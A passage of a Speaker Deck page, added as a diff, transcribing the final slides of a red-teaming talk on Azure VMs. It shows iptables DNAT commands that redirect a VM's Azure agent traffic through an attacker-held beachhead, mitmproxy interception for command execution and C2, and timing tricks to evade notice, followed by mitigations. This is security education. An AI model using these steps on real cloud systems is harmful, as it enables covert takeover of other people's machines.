+http://1..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_102.jpg">VMs Storage Users Hacker AGENT Control http://168.63.129.16 Agent VMs 10.0.4.4</a>
+            </h3>
+            Already Running Pulling for Updates…
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="VMs
+Storage
+Users
+Hacker
+BEACHHEAD
+Control
+http..." title="Blue Cloud of Death: Red Teaming Azure VMs
+Storage
+Users
+Hacker
+BEACHHEAD
+Control
+http..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_103.jpg">VMs Storage Users Hacker BEACHHEAD Control http://168.63.129.16 Malware Agent Beachhead</a>
+            </h3>
+            10.0.4.5 VMs 10.0.4.4 Ideally… • Not of high value • Not monitored closely Install our Malware • To ensure access
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="VMs
+Storage
+Users
+VMs
+10.0.4.4
+Hacker
+REDIRECT
+..." title="Blue Cloud of Death: Red Teaming Azure VMs
+Storage
+Users
+VMs
+10.0.4.4
+Hacker
+REDIRECT
+..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_104.jpg">VMs Storage Users VMs 10.0.4.4 Hacker REDIRECT Control http://168.63.129.16 Beachhead</a>
+            </h3>
+            10.0.4.5 Malware Agent Redirect Agent • via iptables iptables -t nat -I OUTPUT -p tcp --dport 80 -d 168.63.129.16 -m comment --comment &quot;totes not evil&quot; -j DNAT -- to-destination 10.0.4.5:80 Netstat Looks Normal! No New Procs!
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="VMs
+Storage
+Users
+VMs
+10.0.4.4
+Hacker
+MITM
+Cont..." title="Blue Cloud of Death: Red Teaming Azure VMs
+Storage
+Users
+VMs
+10.0.4.4
+Hacker
+MITM
+Cont..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_105.jpg">VMs Storage Users VMs 10.0.4.4 Hacker MITM Control http://168.63.129.16 Beachhead</a>
+            </h3>
+            10.0.4.5 Malware Agent Pass API Requests • via mitmproxy iptables -t nat -I OUTPUT -p tcp --dport 80 -d 10.0.4.5 -m comment -- comment &quot;totes not evil&quot; -j DNAT --to-destination 168.63.129.16:80 MITM
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="VMs
+Storage
+Users
+Hacker
+EXEC
+Control
+http://16..." title="Blue Cloud of Death: Red Teaming Azure VMs
+Storage
+Users
+Hacker
+EXEC
+Control
+http://16..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_106.jpg">VMs Storage Users Hacker EXEC Control http://168.63.129.16 Beachhead 10.0.4.5 Malware</a>
+            </h3>
+            Tasks Created within the Azure Subscription for the Beachhead with the MITM software on it, which will get redirected and executed on the remote target through the pulling process of the Azure endpoint agent MITM Agent VMs 10.0.4.4
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="DEMo: C2 via waagent Redirection
+…
+" title="Blue Cloud of Death: Red Teaming Azure DEMo: C2 via waagent Redirection
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_107.jpg">DEMo: C2 via waagent Redirection …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="GOING THE DISTANCE!
+• Only match the redirect d..." title="Blue Cloud of Death: Red Teaming Azure GOING THE DISTANCE!
+• Only match the redirect d..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_108.jpg">GOING THE DISTANCE! • Only match the redirect during certain</a>
+            </h3>
+            times of the day • man iptables-extensions -&gt; time • … -m time --timestart 01:00 --timestop 02:00 --days Mon,Tue,Wed,Thu,Fri … • Match the redirect periodically • pulls via GETs every 3 seconds • … -m limit -limit … -limit-burst …
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="MITIGATIONS
+• Single Purpose Secrets
+• Limited ..." title="Blue Cloud of Death: Red Teaming Azure MITIGATIONS
+• Single Purpose Secrets
+• Limited ..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_109.jpg">MITIGATIONS • Single Purpose Secrets • Limited the Access of</a>
+            </h3>
+            each Secret • Create roles and limit the access of each role • You can ACL off secrets to only work from certain IP addresses • Log API calls (e.g. cloudtrail) • Never use root secrets (use as a break glass account only) • Rotate Secrets Frequently • Encrypt secrets within GIT and other data stores …
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="THANKS!
+Stage 2 Security
+( Red Teaming AWS &amp; Az..." title="Blue Cloud of Death: Red Teaming Azure THANKS!
+Stage 2 Security
+( Red Teaming AWS &amp;amp; Az..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_110.jpg">THANKS! Stage 2 Security ( Red Teaming AWS &amp; Azure</a>
+            </h3>
+            Env. ) Stage2Sec.com Bryce Kunz @TweekFawkes CNO.io -Training (Salt Lake City, Utah) July 12th &amp; 13th
+        </li>
+    </ol>
+  </div>
+
+    </div>
+
+    <footer class="d-block border-top">
+  <div class="container py-3 py-md-5 text-muted">
+    <div class="row text-center text-md-left">
+      <div class="col-12 col-md-auto mr-auto mb-3 mb-md-0">
+        <div class="copyright-text mb-3 mb-md-0">Copyright &copy; 2021 Speaker Deck, LLC.</div>
+        <div>All slide content and descriptions are owned by their&nbsp;creators.</div>
+      </div>
+      <div class="col-12 col-md-auto">
+        <a href="/faq">F.A.Q.</a> &nbsp;
+        <a href="/tos">Terms</a> &nbsp;
+        <a href="/privacy">Privacy</a> &nbsp;
+        <a href="/dmca">DMCA</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+      <script src="https://d1eu30co0ohy4w.cloudfront.net/assets/stats-a5a5af083780742e6a1a.js"></script>
+  <script data-turbolinks-eval="false">
+    Stats.host = 'speakerdeck.com';
+  </script>
+
+    <script type="text/javascript">
+      var _gaq = _gaq || [];
+      _gaq.push(['_setAccount', 'UA-19290517-1']);
+      _gaq.push(['_setDomainName', '.speakerdeck.com']);
+      _gaq.push(['_trackPageview']);
+
+      (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+      })();
+    </script>
+
+
+    <script>
+      !function(f,b,e,v,n,t,s) {
+        if(f.fbq) return;
+        n=f.fbq=function() { n.callMethod? n.callMethod.apply(n,arguments) : n.queue.push(arguments) };
+        if(!f._fbq) f._fbq=n; n.push=n; n.loaded=!0; n.version='2.0'; n.queue=[];
+        t=b.createElement(e); t.async=!0; t.src=v;
+        s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s)
+      }(window, document,'script', 'https://connect.facebook.net/en_US/fbevents.js');
+
+      fbq('init', '2893765844191276');
+      fbq('track', 'PageView');
+
+    </script>
+    <noscript>
+      <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2893765844191276&ev=PageView&noscript=1" />
+    </noscript>
+
+    <script type="text/javascript" src="https://platform.twitter.com/widgets.js"></script>
+<script>
+  window.fbAsyncInit = function() {
+    FB.init({
+      appId            : '491686710857561',
+      autoLogAppEvents : true,
+      xfbml            : true,
+      version          : 'v2.12'
+    });
+  };
+
+  (function(d, s, id){
+     var js, fjs = d.getElementsByTagName(s)[0];
+     if (d.getElementById(id)) {return;}
+     js = d.createElement(s); js.id = id;
+     js.src = "https://connect.facebook.net/en_US/sdk.js";
+     fjs.parentNode.insertBefore(js, fjs);
+   }(document, 'script', 'facebook-jssdk'));
+</script>
+
+  </body>
+</html>
